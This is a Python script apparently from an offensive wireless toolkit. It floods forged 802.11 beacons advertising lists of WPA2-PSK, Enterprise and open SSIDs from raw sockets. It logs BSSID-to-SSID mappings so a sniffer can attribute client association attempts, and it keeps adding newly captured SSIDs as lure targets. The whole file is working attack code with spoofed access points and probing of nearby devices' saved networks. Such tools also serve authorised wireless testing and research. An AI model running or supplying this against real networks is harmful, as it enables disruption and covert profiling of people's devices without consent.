#!/usr/bin/env python3
# PNL-Beacon-Lure beacon flood: inject beacons for WPA2-PSK, WPA2-Enterprise,
# and OPEN SSID lists on a monitor/inject iface (AF_PACKET). Each SSID gets a
# stable, real-OUI, non-LAA BSSID. PSK/enterprise entries carry an RSN IE
# (+ Privacy bit); open entries carry neither. Nothing answers association, so
# clients can see/probe/attempt but never complete.
#
# Usage:
#   beacon-flood.py <iface> <channel> <psk_file> [cycle_ms] [open_file] [ent_file]
#
#   iface     monitor/inject iface (e.g. wlan1mon); set its channel first
#   channel   channel number to advertise in the DS IE (e.g. 1)
#   psk_file  WPA2-PSK SSIDs, one per line (#/blank ignored; |suffix stripped)
#   cycle_ms  target ms for one full pass over all frames (default 200)
#   open_file optional OPEN SSID list
#   ent_file  optional WPA2-Enterprise (802.1X) SSID list
#
# Author: Skinny Research & Development

import os
import socket
import sys
import time
import zlib

iface = sys.argv[1] if len(sys.argv) > 1 else "wlan1mon"
channel = int(sys.argv[2]) if len(sys.argv) > 2 else 1
psk_file = sys.argv[3] if len(sys.argv) > 3 else "lists/wpa.txt"
cycle_ms = float(sys.argv[4]) if len(sys.argv) > 4 else 200.0
open_file = sys.argv[5] if len(sys.argv) > 5 else ""
ent_file = sys.argv[6] if len(sys.argv) > 6 else ""
retarget_file = sys.argv[7] if len(sys.argv) > 7 else ""
retarget_secs = float(sys.argv[8]) if len(sys.argv) > 8 else 15.0

BASE = bytes.fromhex("001337ac644c")  # 00:13:37:ac:64:4c (real OUI, non-LAA)

AKM_PSK = b"\x00\x0f\xac\x02"
AKM_8021X = b"\x00\x0f\xac\x01"
CIPHER_CCMP = b"\x00\x0f\xac\x04"


def load_ssids(path, required):
    out = []
    if not path:
        return out
    try:
        with open(path, "r", errors="ignore") as fh:
            for line in fh:
                line = line.split("|", 1)[0].strip()
                if not line or line.startswith("#"):
                    continue
                out.append(line[:32])
    except OSError as exc:
        if required:
            sys.stderr.write("beacon-flood: cannot read %s: %s\n" % (path, exc))
            sys.exit(1)
    return out


def bssid_for(ssid, salt):
    h = zlib.crc32((salt + ssid).encode("utf-8", "ignore")) & 0xFFFFFF
    return BASE[:3] + h.to_bytes(3, "big")


def ie(tag, data):
    return bytes([tag, len(data)]) + data


def beacon(bssid, ssid, ch, mode):
    # mode: "open" | "psk" | "enterprise"
    fc = b"\x80\x00"
    dur = b"\x00\x00"
    da = b"\xff\xff\xff\xff\xff\xff"
    priv = b"\x31\x04" if mode != "open" else b"\x21\x04"  # ESS|Slot|Pre(+Privacy)
    fixed = b"\x00" * 8 + b"\x64\x00" + priv
    ies = ie(0, ssid.encode("utf-8", "ignore"))
    ies += ie(1, bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]))
    ies += ie(3, bytes([ch & 0xFF]))
    if mode != "open":
        akm = AKM_PSK if mode == "psk" else AKM_8021X
        rsn = (b"\x01\x00" + CIPHER_CCMP + b"\x01\x00" + CIPHER_CCMP
               + b"\x01\x00" + akm + b"\x00\x00")
        ies += ie(48, rsn)
    ies += ie(50, bytes([0x30, 0x48, 0x60, 0x6c]))
    return fc + dur + da + bssid + bssid + b"\x00\x00" + fixed + ies


def main():
    psk = load_ssids(psk_file, True)
    opn = load_ssids(open_file, False)
    ent = load_ssids(ent_file, False)
    if not psk and not opn and not ent:
        sys.stderr.write("beacon-flood: no SSIDs to advertise\n")
        sys.exit(1)
    radiotap = bytes([0x00, 0x00, 0x09, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02])
    frames = [radiotap + beacon(bssid_for(s, "w"), s, channel, "psk") for s in psk]
    frames += [radiotap + beacon(bssid_for(s, "o"), s, channel, "open") for s in opn]
    frames += [radiotap + beacon(bssid_for(s, "e"), s, channel, "enterprise") for s in ent]

    # Map our BSSIDs -> SSID so the sniffer can attribute AUTH/ASSOC hits.
    map_path = os.environ.get("PNL_BSSID_MAP", "/tmp/pnl-beacon-lure-bssid-map.txt")
    try:
        with open(map_path, "w") as fh:
            for salt, group in (("w", psk), ("o", opn), ("e", ent)):
                for s in group:
                    b = bssid_for(s, salt)
                    fh.write("%s\t%s\n" % (":".join("%02x" % x for x in b), s))
    except OSError as exc:
        sys.stderr.write("beacon-flood: cannot write bssid map %s: %s\n" % (map_path, exc))

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((iface, 0))
    sys.stderr.write("beacon-flood: %d psk + %d open + %d ent on %s ch%d, target %.0fms/cycle\n"
                     % (len(psk), len(opn), len(ent), iface, channel, cycle_ms))

    # Dynamic retargeting: periodically fold freshly-captured SSIDs into the
    # beacon mix and append them to the BSSID map.
    known = set(psk) | set(opn) | set(ent)

    def add_retarget():
        added = []
        try:
            fh = open(retarget_file, "r", errors="ignore")
        except OSError:
            return added
        for line in fh:
            s = line.split("\t", 1)[0].split("|", 1)[0].strip()
            if not s or len(s) > 32 or s in known:
                continue
            known.add(s)
            frames.append(radiotap + beacon(bssid_for(s, "r"), s, channel, "psk"))
            added.append(s)
        fh.close()
        if added:
            try:
                with open(map_path, "a") as mf:
                    for s in added:
                        mf.write("%s\t%s\n" % (":".join("%02x" % x for x in bssid_for(s, "r")), s))
            except OSError:
                pass
        return added

    if retarget_file:
        sys.stderr.write("beacon-flood: retargeting %s every %.0fs\n" % (retarget_file, retarget_secs))
    last_rt = time.time()

    target = cycle_ms / 1000.0
    sent = 0
    last = time.time()
    while True:
        start = time.time()
        for fr in frames:
            try:
                sock.send(fr)
            except OSError:
                pass
            sent += 1
        elapsed = time.time() - start
        if elapsed < target:
            time.sleep(target - elapsed)
        now = time.time()
        if retarget_file and (now - last_rt) >= retarget_secs:
            new = add_retarget()
            if new:
                sys.stderr.write("beacon-flood: +%d retarget SSIDs (%d total)\n" % (len(new), len(frames)))
            last_rt = now
        if now - last >= 10:
            dt = now - last
            sys.stderr.write("beacon-flood: %d frames in %.1fs (~%.0f fps; %d psk/%d open/%d ent/%d retarget)\n"
                             % (sent, dt, sent / dt, len(psk), len(opn), len(ent), len(frames) - len(psk) - len(opn) - len(ent)))
            sent = 0
            last = now


if __name__ == "__main__":
    main()
